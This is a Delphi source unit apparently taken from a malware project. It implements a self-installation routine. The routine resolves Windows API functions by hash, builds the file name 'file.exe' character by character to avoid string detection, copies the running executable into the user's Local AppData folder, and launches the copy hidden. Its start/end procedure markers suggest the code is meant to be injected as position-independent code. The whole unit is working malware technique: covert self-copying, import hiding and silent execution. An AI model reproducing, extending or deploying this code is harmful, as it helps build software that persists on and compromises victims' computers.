unit untInstallation;

interface

uses
  Windows,
  untUtils;

const
  CSIDL_LOCAL_APPDATA        = $001C;

type
  TInstallRec = packed record
    pAPI:PAPIRec;
    xGetModuleFileNameW:function(hModule: HINST; lpFilename: PWideChar; nSize: DWORD): DWORD; stdcall;
    xCopyFileW:function(lpExistingFileName, lpNewFileName: PWideChar; bFailIfExists: BOOL): BOOL; stdcall;
    xShellExecuteW:function(hWnd: HWND; Operation, FileName, Parameters, Directory: PWideChar; ShowCmd: Integer): HINST; stdcall;
    xSHGetFolderPathW:function(hwnd: HWND; csidl: Integer; hToken: THandle; dwFlags: DWORD; pszPath: PWideChar): HResult; stdcall;
  end;
  PInstallRec = ^TInstallRec;

procedure CopyMySelf_CALLER(pAPI:PAPIRec); stdcall;
procedure CopyMySelf(pAPI:PAPIRec);
procedure CopyMySelf_END();

implementation

procedure CopyMySelf_CALLER(pAPI:PAPIRec); stdcall;
begin
  CopyMySelf(pAPI);
end;

function CopyMySelf_GETAPI(pAPI:PAPIRec):PInstallRec;
begin
  Result := pAPI.xAllocMem(pAPI, SizeOf(TInstallRec));
  if Result <> nil then
  begin
    Result.xGetModuleFileNameW := pAPI.xGetProcAddressEx(pAPI.hKernel32, $FC6B42F1, 18);
    Result.xSHGetFolderPathW := pAPI.xGetProcAddressEx(pAPI.hShell32, $C7652B3F, 16);
    Result.xCopyFileW := pAPI.xGetProcAddressEx(pAPI.hKernel32, $F54D69C8, 9);
    Result.xShellExecuteW := pAPI.xGetProcAddressEx(pAPI.hShell32, $1FA8A1D9, 13);
  end;
end;

function GetCurrentDir(pInstall:PInstallRec):PWideChar;
begin
  Result := pInstall.pAPI.xAllocMem(pInstall.pAPI, MAX_PATH * 2);
  if Result <> nil then
    pInstall.xGetModuleFileNameW(0, Result, MAX_PATH * 2);
end;

function LocalAppDataPath(pInstall:PInstallRec): PWideChar;
const
  SHGFP_TYPE_CURRENT = 0;
var
  strFileName:Array[0..11] of WideChar;
begin
  strFileName[0]:='\';strFileName[1]:='f';strFileName[2]:='i';strFileName[3]:='l';strFileName[4]:='e';strFileName[5]:='.';strFileName[6]:='e';strFileName[7]:='x';strFileName[8]:='e';strFileName[9]:=#0;
  Result := pInstall.pAPI.xAllocMem(pInstall.pAPI, MAX_PATH * 2);
  pInstall.xSHGetFolderPathW(0, CSIDL_LOCAL_APPDATA, 0, 0, Result);
  pInstall.pAPI.xlstrcatW(Result, @strFileName);
end;

procedure CopyMySelf(pAPI:PAPIRec);
var
  pCurrDirectory, pDestinationDirectory:PWideChar;
  pInstall:PInstallRec;
begin
  pInstall := CopyMySelf_GETAPI(pAPI);
  if pInstall <> nil then
  begin
    pCurrDirectory := GetCurrentDir(pInstall);
    pDestinationDirectory := LocalAppDataPath(pInstall);
    if pAPI.xlstrcmpw(pCurrDirectory, pDestinationDirectory) <> 0 then
    begin
      pInstall.xCopyFileW(pCurrDirectory, pDestinationDirectory, False);
      pInstall.xShellExecuteW(0, nil, pDestinationDirectory, nil, nil, 0);
    end;
    pAPI.xFreeMem(pAPI, pCurrDirectory);
    pAPI.xFreeMem(pAPI, pDestinationDirectory);
    pAPI.xFreeMem(pAPI, pInstall);
  end;
end;

procedure CopyMySelf_END();asm end;

end.
